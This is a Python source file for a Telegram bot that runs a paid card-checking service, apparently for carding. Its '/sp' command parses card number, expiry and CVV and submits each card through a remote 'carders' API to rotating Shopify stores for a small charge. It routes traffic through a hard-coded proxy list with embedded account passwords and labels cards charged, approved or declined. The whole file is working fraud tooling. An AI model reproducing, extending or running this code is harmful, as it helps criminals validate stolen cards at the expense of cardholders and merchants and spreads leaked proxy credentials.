from live_emoji import plan_badge, dev_badge
import asyncio
import re
import logging
import aiohttp
import json
import time
import random
import os
import psycopg2.extras
from html import escape

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# AIogram Imports
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
from aiogram import types, F, Router
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.exceptions import TelegramForbiddenError, TelegramBadRequest

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# LOCAL IMPORTS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
from database import is_gate_enabled, get_user_credits, update_credits, get_db_connection
from bin import get_bin_info
from sub import get_premium_status

router = Router()

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# GIF REACTIONS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

REACTIONS = [
    "airkiss", "blush", "brofist", "celebrate", "cheers", "clap",
    "cool", "cuddle", "dance", "handhold", "happy", "hug",
    "kiss", "laugh", "lick", "love", "nervous", "nom",
    "nuzzle", "nyah", "pat", "peek", "shy", "sip",
    "sleep", "smile", "smug", "sorry", "thumbsup",
    "tickle", "tired", "wave", "wink", "yay", "yes"
]

async def get_anime_gif():
    """Fetches a random anime reaction GIF from otakugifs API."""
    reaction = random.choice(REACTIONS)
    api_url = f"https://api.otakugifs.xyz/gif?reaction={reaction}"
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(api_url, timeout=10) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    return data.get("url")
    except Exception as e:
        logging.error(f"Error fetching anime gif: {e}")
    return "https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExM3Z6eXF6eXF6eXF6eXF6eXF6eXF6eXF6SZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/LdOyjZ7h5xS3yCjQ8I/giphy.gif"

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# CONFIGURATION
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

API_URL = "https://carders2.up.railway.app/shopii"
SITES_FILE = "sites.txt"
MAX_SITE_ROTATIONS = 20

PROXY_LIST = [
    "http://purevpn0s551451:9dpdlc2nfxgj@px241104.pointtoserver.com:10780",
    "http://purevpn0s551451:9dpdlc2nfxgj@px270401.pointtoserver.com:10780",
    "http://purevpn0s551451:9dpdlc2nfxgj@px400408.pointtoserver.com:10780",
    "http://purevpn0s551451:9dpdlc2nfxgj@px440401.pointtoserver.com:10780",
    "http://purevpn0s551451:9dpdlc2nfxgj@px591201.pointtoserver.com:10780",
    "http://purevpn0s551451:9dpdlc2nfxgj@px591203.pointtoserver.com:10780",
    "http://purevpn0s8732217:i67s60ep@px013304.pointtoserver.com:10780",
    "http://purevpn0s8732217:i67s60ep@px016104.pointtoserver.com:10780",
    "http://purevpn0s8732217:i67s60ep@px032004.pointtoserver.com:10780",
    "http://purevpn0s8732217:i67s60ep@px040805.pointtoserver.com:10780",
    "http://purevpn0s8732217:i67s60ep@px080702.pointtoserver.com:10780",
    "http://purevpn0s8732217:i67s60ep@px1260303.pointtoserver.com:10780",
    "http://purevpn0s8732217:i67s60ep@px380101.pointtoserver.com:10780",
    "http://purevpn0s8732217:i67s60ep@px400408.pointtoserver.com:10780",
    "http://purevpn0s8732217:i67s60ep@px400501.pointtoserver.com:10780",
    "http://purevpn0s8732217:i67s60ep@px420602.pointtoserver.com:10780",
    "http://purevpn0s8732217:i67s60ep@px440401.pointtoserver.com:10780",
    "http://purevpn0s8732217:i67s60ep@px520401.pointtoserver.com:10780",
    "http://purevpn0s8732217:i67s60ep@px591801.pointtoserver.com:10780",
    "http://user3proxyserver:huccuAn_oc7o87hubhjYY@us-free-proxy.g-w.info:59781",
    "http://yosz6g8y:yOSZ6g8y@135.148.98.200:59746",
]

# Responses that mean "try a different site" — not a real card result
RETRY_ERRORS = [
    'r4 token empty', 'payment method is not shopify!', 'r2 id empty',
    'product not found', 'hcaptcha detected', 'tax ammount empty',
    'del ammount empty', 'product id is empty', 'py id empty',
    'clinte token', 'hcaptcha_detected', 'receipt_empty', 'na',
    'site error! status: 429', 'site requires login!', 'failed to get token',
    'no valid products', 'not shopify!', 'site error! status: 404',
    'site error! status: 401', 'site error! status: 402',
    'failed to get checkout', 'captcha at checkout', 'site not supported',
    'connection error', 'connection error!', 'error processing card',
    '504', 'server error', 'client error', 'failed', 'amount_too_small',
    'change proxy or site', 'token not found', 'invalid_response',
    'resolve', 'item', 'curl error', 'could not resolve host',
    'connect tunnel failed',
]

# Custom Emoji IDs
CUSTOM_CHARGED_EMOJI_ID = "4956719506027185156"
CUSTOM_APPROVED_EMOJI_ID = "4958610528588008305"
CUSTOM_DECLINED_EMOJI_ID = "4956612582816351459"

# Rate limit tracker (trial users only)
user_last_command_time: dict = {}

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# DATABASE HELPERS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def ensure_stats_columns():
    try:
        conn = get_db_connection()
        cursor = conn.cursor()
        try:
            cursor.execute("ALTER TABLE users ADD COLUMN IF NOT EXISTS cc_checked INTEGER DEFAULT 0")
        except Exception:
            pass
        try:
            cursor.execute("ALTER TABLE users ADD COLUMN IF NOT EXISTS cc_charged INTEGER DEFAULT 0")
        except Exception:
            pass
        conn.commit()
        conn.close()
    except Exception as e:
        logging.error(f"[SP] Error checking stats columns: {e}")

ensure_stats_columns()

def update_user_stats_sync(user_id: int, is_charged: bool):
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute(
        "UPDATE users SET cc_checked = cc_checked + 1 WHERE user_id = %s",
        (user_id,)
    )
    if is_charged:
        cursor.execute(
            "UPDATE users SET cc_charged = cc_charged + 1 WHERE user_id = %s",
            (user_id,)
        )
    conn.commit()
    conn.close()

async def get_user_plan_name(user_id: int) -> str:
    is_premium, _ = await asyncio.to_thread(get_premium_status, user_id)
    if is_premium:
        try:
            def _fetch():
                conn = get_db_connection()
                cursor = conn.cursor(cursor_factory=psycopg2.extras.RealDictCursor)
                cursor.execute(
                    "SELECT plan FROM receipts WHERE user_id = %s ORDER BY purchased_on DESC LIMIT 1",
                    (user_id,)
                )
                row = cursor.fetchone()
                conn.close()
                return row["plan"].upper() if row else "PREMIUM"
            return await asyncio.to_thread(_fetch)
        except Exception as e:
            logging.error(f"[SP] Error fetching plan name: {e}")
        return "PREMIUM"
    return "FREE"

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# HELPERS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def load_sites() -> list:
    try:
        if not os.path.exists(SITES_FILE):
            return []
        with open(SITES_FILE, "r", encoding="utf-8", errors="ignore") as f:
            return [line.strip() for line in f if line.strip()]
    except Exception as e:
        logging.error(f"[SP] Error loading sites: {e}")
        return []

def luhn_check(card_number: str) -> bool:
    card_number = str(card_number).strip()
    if not card_number.isdigit():
        return False
    total = 0
    for i, char in enumerate(card_number[::-1]):
        digit = int(char)
        if i % 2 == 1:
            digit *= 2
            if digit > 9:
                digit -= 9
        total += digit
    return total % 10 == 0

def build_user_link(user_obj) -> str:
    """Builds a clickable user mention link."""
    name = escape(user_obj.first_name or "User")
    if user_obj.username:
        return f'<a href="https://t.me/{escape(user_obj.username)}">{name}</a>'
    return f'<a href="tg://user?id={user_obj.id}">{name}</a>'

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# COMMAND HANDLER
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

@router.message(F.text.startswith("/sp"))
async def sp_command(message: types.Message):
    # ─── Gate check ─────────────────────────────────────────────────
    if not await asyncio.to_thread(is_gate_enabled, "sp"):
        await message.reply(
            "🚧 <b>𝗦𝗣 𝗚𝗮𝘁𝗲 𝗶𝘀 𝘂𝗻𝗱𝗲𝗿 𝗠𝗮𝗶𝗻𝘁𝗲𝗻𝗮𝗻𝗰𝗲.</b>",
            parse_mode="HTML"
        )
        return

    user = message.from_user
    user_id = user.id
    current_time = time.time()

    is_premium, _ = await asyncio.to_thread(get_premium_status, user_id)

    # ─── Rate limit (trial users only) ──────────────────────────────
    if not is_premium:
        last = user_last_command_time.get(user_id, 0)
        elapsed = current_time - last
        if elapsed < 10:
            remaining = round(10 - elapsed, 1)
            await message.reply(
                f"<tg-emoji emoji-id=\"6255910249362885846\">⚠️</tg-emoji> <b>Aᴄᴛɪᴠᴇ Cᴏᴏʟᴅᴏᴡɴ !</b>\n\n"
                f"<b>Pʟᴇᴀsᴇ Wᴀɪᴛ <code>{remaining}</code> Sᴇᴄᴏɴᴅs Bᴇғᴏʀᴇ Cᴏɴᴛɪɴᴜɪɴɢ.</b>\n\n"
                f"<tg-emoji emoji-id=\"6136275172283391020\">⭐</tg-emoji> <b>Pᴜʀᴄʜᴀsᴇ Pʀᴇᴍɪᴜᴍ Pʟᴀɴ Fᴏʀ Usᴇ Cᴏᴍᴍᴀɴᴅs Wɪᴛʜᴏᴜᴛ Cᴏᴏʟᴅᴏᴡɴ.</b>",
                parse_mode="HTML"
            )
            return
        user_last_command_time[user_id] = current_time

    # ─── Credit check ────────────────────────────────────────────────
    current_credits = await asyncio.to_thread(get_user_credits, user_id)
    if current_credits is None or current_credits < 1:
        await message.reply(
            "<tg-emoji emoji-id=\"4956612582816351459\">❌</tg-emoji> <b>Iɴsᴜғғɪᴄɪᴇɴᴛ Cʀᴇᴅɪᴛs</b>\n\n"
            "Yᴏᴜ Nᴇᴇᴅ Aᴛ Lᴇᴀsᴛ <b>1 Cʀᴇᴅɪᴛ</b> Tᴏ Usᴇ Tʜɪs Gᴀᴛᴇ.\n"
            "Usᴇ /plan Tᴏ Gᴇᴛ Mᴏʀᴇ.",
            parse_mode="HTML"
        )
        return

    # ─── Extract card from text or replied message ───────────────────
    parts = message.text.split(maxsplit=1)
    raw_text = parts[1].strip() if len(parts) > 1 else ""

    if message.reply_to_message:
        replied = message.reply_to_message
        raw_text += " " + (replied.text or replied.caption or "")

    if not raw_text.strip():
        await message.reply(
            "<tg-emoji emoji-id=\"4956612582816351459\">❌</tg-emoji> <b>Usage:</b> /sp <code>cc|mm|yy|cvv</code>\n"
            "Or reply to a message containing card details.",
            parse_mode="HTML"
        )
        return

    # ─── Parse card ──────────────────────────────────────────────────
    pattern = r'(\d{13,19})[\|/:\s]+(\d{1,2})[\|/:\s]+(\d{2,4})[\|/:\s]+(\d{3,4})'
    match = re.search(pattern, raw_text)
    if not match:
        await message.reply(
            "<tg-emoji emoji-id=\"4956612582816351459\">❌</tg-emoji> <b>Invalid Card Format.</b>\n"
            "Please send as <code>4242424242424242|05|27|123</code>",
            parse_mode="HTML"
        )
        return

    cc, mm, yy_raw, cvv = match.groups()
    mm = mm.zfill(2)
    yy = yy_raw[2:] if len(yy_raw) == 4 else yy_raw
    formatted_cc = f"{cc}|{mm}|{yy}|{cvv}"

    # ─── Luhn check ──────────────────────────────────────────────────
    if not luhn_check(cc):
        await message.reply(
            "<tg-emoji emoji-id=\"4956612582816351459\">❌</tg-emoji> <b>Invalid Card Number</b>\n"
            "Luhn check failed.",
            parse_mode="HTML"
        )
        return

    # ─── Sites check ─────────────────────────────────────────────────
    sites = load_sites()
    if not sites:
        await message.reply(
            "<tg-emoji emoji-id=\"4956612582816351459\">❌</tg-emoji> No sites found in <code>sites.txt</code>.",
            parse_mode="HTML"
        )
        return

    plan_name = await get_user_plan_name(user_id)

    escaped_card = escape(formatted_cc)
    proc_msg = await message.reply(
        f"<b>Pʀᴏᴄᴇssɪɴɢ...</b><tg-emoji emoji-id=\"6154603635981423575\">⏳</tg-emoji>\n"
        f"<pre><code>{escaped_card}</code></pre>\n"
        f"<b>Gᴀᴛᴇ ➺ Sʜᴏᴘɪғʏ 0.98USD</b>\n",
        parse_mode="HTML"
    )

    asyncio.create_task(
        process_sp_check(message, proc_msg, user, user_id, formatted_cc, cc, plan_name, sites)
    )

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# BACKGROUND PROCESSOR
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

async def process_sp_check(
    message: types.Message,
    proc_msg: types.Message,
    user: types.User,
    user_id: int,
    formatted_cc: str,
    cc: str,
    plan_name: str,
    sites: list,
):
    check_started = time.time()
    api_result = {"Response": "UNKNOWN_ERROR"}
    last_site = None

    for _ in range(MAX_SITE_ROTATIONS):
        # Pick a site different from last if possible
        candidates = [s for s in sites if s != last_site] or sites
        current_site = random.choice(candidates)
        last_site = current_site

        proxy = random.choice(PROXY_LIST)

        try:
            timeout = aiohttp.ClientTimeout(total=45)
            params = {"site": current_site, "cc": formatted_cc, "proxy": proxy}
            async with aiohttp.ClientSession() as session:
                async with session.get(API_URL, params=params, timeout=timeout) as resp:
                    text = await resp.text()
                    try:
                        api_result = json.loads(text)
                    except json.JSONDecodeError:
                        api_result = {"Response": f"PARSE_ERROR"}
        except Exception as e:
            logging.error(f"[SP] API error ({current_site}): {e}")
            api_result = {"Response": "CONNECTION_ERROR"}

        response_lower = api_result.get("Response", "").lower()
        should_rotate = any(err in response_lower for err in RETRY_ERRORS)
        if not should_rotate:
            break

    # ─── BIN lookup ──────────────────────────────────────────────────
    try:
        bin_info = await get_bin_info(cc[:6])
    except Exception:
        bin_info = {}

    bin_scheme = bin_info.get("scheme", "N/A")
    bin_bank = bin_info.get("bank", "N/A")
    country_name = bin_info.get("country", "N/A")
    country_flag = bin_info.get("country_emoji", "")
    bin_country = f"{country_flag} {country_name}".strip() if country_flag else country_name
    type = bin_info.get("type") or "N/A"

    # ─── Determine status ────────────────────────────────────────────
    response_raw = api_result.get("Response", "").upper()
    response_lower = response_raw.lower()
    is_charged_stat = False

    CHARGED_KEYWORDS = ["order_placed", "charged", "order_paid", "thank you", "thank_you"]
    APPROVED_KEYWORDS = [
        "3ds_required", "3d_authentication", "insufficient_funds",
        "invalid_cvc", "incorrect_cvc", "invalid_zip", "incorrect_zip",
    ]

    is_technical_error = (
        any(err in response_lower for err in RETRY_ERRORS)
        or "error" in response_lower
        or "timeout" in response_lower
    )

    if is_technical_error:
        final_status = "<b>Ꭼʀʀᴏʀ</b> ⚠️"
        credits_to_deduct = 0
    elif any(k in response_lower for k in CHARGED_KEYWORDS):
        final_status = f'<b>ᏟꮋꭺꭱƦᏽꭼꭰ</b> <tg-emoji emoji-id="{CUSTOM_CHARGED_EMOJI_ID}">🔥</tg-emoji>'
        is_charged_stat = True
        credits_to_deduct = 1
    elif any(k in response_lower for k in APPROVED_KEYWORDS):
        final_status = f'<b>ᎪꮲꮲꭱƦꮎꮩꭼꭰ</b> <tg-emoji emoji-id="{CUSTOM_APPROVED_EMOJI_ID}">✅</tg-emoji>'
        is_charged_stat = True
        credits_to_deduct = 1
    else:
        final_status = f'<b>Ꭰᴇᴄʟɪɴᴇᴅ</b> <tg-emoji emoji-id="{CUSTOM_DECLINED_EMOJI_ID}">❌</tg-emoji>'
        credits_to_deduct = 1

    # ─── Deduct 1 credit (skip if technical error) ───────────────────
    if credits_to_deduct > 0:
        current_credits = await asyncio.to_thread(get_user_credits, user_id)
        new_balance = max(0, current_credits - 1)
        await asyncio.to_thread(update_credits, user_id, new_balance)

    # ─── Update stats ────────────────────────────────────────────────
    await asyncio.to_thread(update_user_stats_sync, user_id, is_charged_stat)

    # ─── Build result message ─────────────────────────────────────────
    user_link = build_user_link(user)
    dev_link = dev_badge()
    user_display = f"{user_link} {plan_badge(plan_name)}"

    elapsed = time.time() - check_started
    final_caption = (
        f'<b><a href="https://t.me/broken_wiz">[⌭]</a> Sᴛᴀᴛᴜs ➵ {final_status}</b>\n'
        f"<tg-emoji emoji-id=\"5920055227133725805\">💳</tg-emoji>\n"
        f"⤷ <code>{formatted_cc}</code>\n"
        f"━━━━━━━━━━━\n"
        f'<b><a href="https://t.me/broken_wiz">⬢</a> Gᴀᴛᴇ ➵ Sʜᴏᴘɪғʏ | 0.98USD</b>\n'
        f'<b><a href="https://t.me/broken_wiz">⬡</a> Rᴀᴡ ➺ {response_raw}</b>\n'
        f"━━━━━━━━━━━\n"
        f"<b>Tʏᴘᴇ ➵</b> <code>[ {type} ]</code>\n"
        f"<b>Iɴꜰᴏ ➵</b> <code>{bin_scheme} - {bin_bank} - {bin_country}</code>\n"
        f"━━━━━━━━━━━\n"
        f"<tg-emoji emoji-id=\"5440621591387980068\">🔜</tg-emoji> <b>➵ {elapsed:.2f}s</b>\n"
        f"<tg-emoji emoji-id=\"6028240037366207289\">👤</tg-emoji> <b>➵ {user_display}</b>\n"
        f"<tg-emoji emoji-id=\"5429615084856969948\">🏴‍☠️</tg-emoji> <b>➵ {dev_link}</b>"
    )

    # G. FETCH ANIME GIF
    gif_url = await get_anime_gif()

    # H. Send as Animation (GIF) with Caption
    try:
        # Try to delete the processing message first
        try:
            await proc_msg.delete()
        except Exception:
            pass
        
        # Send as animation with GIF
        await message.reply_animation(
            animation=gif_url,
            caption=final_caption,
            parse_mode="HTML",
            disable_web_page_preview=True
        )
    except (TelegramForbiddenError, TelegramBadRequest) as e:
        # Fallback to editing the processing message if GIF sending fails
        logging.warning(f"[SP] Could not send GIF, falling back to text: {e}")
        try:
            await proc_msg.edit_text(
                text=final_caption,
                parse_mode="HTML",
                disable_web_page_preview=True
            )
        except Exception as edit_err:
            logging.error(f"Error editing message: {edit_err}")
            await message.reply(
                text=final_caption,
                parse_mode="HTML",
                disable_web_page_preview=True
            )
    except Exception as e:
        # Ultimate fallback - just edit the processing message
        logging.error(f"Error sending result: {e}")
        try:
            await proc_msg.edit_text(
                text=final_caption,
                parse_mode="HTML",
                disable_web_page_preview=True
            )
        except Exception:
            await message.reply(
                text=final_caption,
                parse_mode="HTML",
                disable_web_page_preview=True
            )
